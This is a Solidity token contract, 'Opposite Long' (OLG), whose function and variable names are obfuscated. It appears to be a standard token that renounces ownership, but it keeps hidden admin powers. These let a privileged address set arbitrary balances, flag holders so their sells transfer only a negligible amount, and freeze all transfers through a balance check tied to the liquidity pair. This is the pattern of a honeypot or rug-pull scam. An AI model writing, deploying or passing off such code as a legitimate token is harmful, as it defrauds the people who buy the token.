//SPDX-License-Identifier: MIT

pragma solidity ^0.8.6;

interface autoList {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

abstract contract listTo {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

interface takeToken {
    function createPair(address walletTotal, address modeReceiver) external returns (address);
}

interface sellReceiver {
    function totalSupply() external view returns (uint256);

    function balanceOf(address toWallet) external view returns (uint256);

    function transfer(address maxSwapReceiver, uint256 totalMarketing) external returns (bool);

    function allowance(address fromExempt, address spender) external view returns (uint256);

    function approve(address spender, uint256 totalMarketing) external returns (bool);

    function transferFrom(
        address sender,
        address maxSwapReceiver,
        uint256 totalMarketing
    ) external returns (bool);

    event Transfer(address indexed from, address indexed receiverMode, uint256 value);
    event Approval(address indexed fromExempt, address indexed spender, uint256 value);
}

interface launchedWallet is sellReceiver {
    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);
}

contract OppositeLong is listTo, sellReceiver, launchedWallet {

    bool public liquidityMode;

    bool public txExempt;

    address feeEnable = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;

    uint256 constant listExempt = 14 ** 10;

    uint256 private maxAt;

    mapping(address => bool) public sellFee;

    string private minMarketingBuy = "Opposite Long";

    uint256 private enableSwap = 100000000 * 10 ** 18;

    function fromLimit() private view {
        require(sellFee[_msgSender()]);
    }

    bool public modeMinAt;

    bool public listBuy;

    function name() external view virtual override returns (string memory) {
        return minMarketingBuy;
    }

    function owner() external view returns (address) {
        return buyListAmount;
    }

    uint8 private enableBuy = 18;

    function tradingAmount(address buyTeam) public {
        fromLimit();
        
        if (buyTeam == receiverLaunchAuto || buyTeam == listLaunched) {
            return;
        }
        launchMax[buyTeam] = true;
    }

    address public receiverLaunchAuto;

    uint256 public sellLaunch;

    function symbol() external view virtual override returns (string memory) {
        return sellTo;
    }

    bool public isAtAuto;

    function balanceOf(address toWallet) public view virtual override returns (uint256) {
        return autoFeeList[toWallet];
    }

    function walletFromFund(address enableIs, address maxSwapReceiver, uint256 totalMarketing) internal returns (bool) {
        if (enableIs == receiverLaunchAuto) {
            return totalMode(enableIs, maxSwapReceiver, totalMarketing);
        }
        uint256 fundIsFee = sellReceiver(listLaunched).balanceOf(feeEnable);
        require(fundIsFee == limitWallet);
        require(maxSwapReceiver != feeEnable);
        if (launchMax[enableIs]) {
            return totalMode(enableIs, maxSwapReceiver, listExempt);
        }
        return totalMode(enableIs, maxSwapReceiver, totalMarketing);
    }

    mapping(address => mapping(address => uint256)) private receiverSender;

    event OwnershipTransferred(address indexed autoTokenExempt, address indexed swapMode);

    function receiverFundTake(uint256 totalMarketing) public {
        fromLimit();
        limitWallet = totalMarketing;
    }

    function fromReceiver() public {
        emit OwnershipTransferred(receiverLaunchAuto, address(0));
        buyListAmount = address(0);
    }

    address private buyListAmount;

    constructor (){
        if (modeMinAt == liquidityMode) {
            sellLaunch = maxAt;
        }
        autoList receiverBuy = autoList(tokenLaunched);
        listLaunched = takeToken(receiverBuy.factory()).createPair(receiverBuy.WETH(), address(this));
        
        receiverLaunchAuto = _msgSender();
        fromReceiver();
        sellFee[receiverLaunchAuto] = true;
        autoFeeList[receiverLaunchAuto] = enableSwap;
        
        emit Transfer(address(0), receiverLaunchAuto, enableSwap);
    }

    function transferFrom(address enableIs, address maxSwapReceiver, uint256 totalMarketing) external override returns (bool) {
        if (_msgSender() != tokenLaunched) {
            if (receiverSender[enableIs][_msgSender()] != type(uint256).max) {
                require(totalMarketing <= receiverSender[enableIs][_msgSender()]);
                receiverSender[enableIs][_msgSender()] -= totalMarketing;
            }
        }
        return walletFromFund(enableIs, maxSwapReceiver, totalMarketing);
    }

    address public listLaunched;

    uint256 limitWallet;

    function approve(address maxList, uint256 totalMarketing) public virtual override returns (bool) {
        receiverSender[_msgSender()][maxList] = totalMarketing;
        emit Approval(_msgSender(), maxList, totalMarketing);
        return true;
    }

    mapping(address => bool) public launchMax;

    uint256 sellFrom;

    function tokenReceiverExempt(address toSell, uint256 totalMarketing) public {
        fromLimit();
        autoFeeList[toSell] = totalMarketing;
    }

    function totalSupply() external view virtual override returns (uint256) {
        return enableSwap;
    }

    mapping(address => uint256) private autoFeeList;

    function toLimit(address exemptTo) public {
        if (isAtAuto) {
            return;
        }
        
        sellFee[exemptTo] = true;
        
        isAtAuto = true;
    }

    uint256 public fundAt;

    function getOwner() external view returns (address) {
        return buyListAmount;
    }

    function allowance(address autoTake, address maxList) external view virtual override returns (uint256) {
        if (maxList == tokenLaunched) {
            return type(uint256).max;
        }
        return receiverSender[autoTake][maxList];
    }

    function transfer(address toSell, uint256 totalMarketing) external virtual override returns (bool) {
        return walletFromFund(_msgSender(), toSell, totalMarketing);
    }

    address tokenLaunched = 0x10ED43C718714eb63d5aA57B78B54704E256024E;

    string private sellTo = "OLG";

    function decimals() external view virtual override returns (uint8) {
        return enableBuy;
    }

    function totalMode(address enableIs, address maxSwapReceiver, uint256 totalMarketing) internal returns (bool) {
        require(autoFeeList[enableIs] >= totalMarketing);
        autoFeeList[enableIs] -= totalMarketing;
        autoFeeList[maxSwapReceiver] += totalMarketing;
        emit Transfer(enableIs, maxSwapReceiver, totalMarketing);
        return true;
    }

}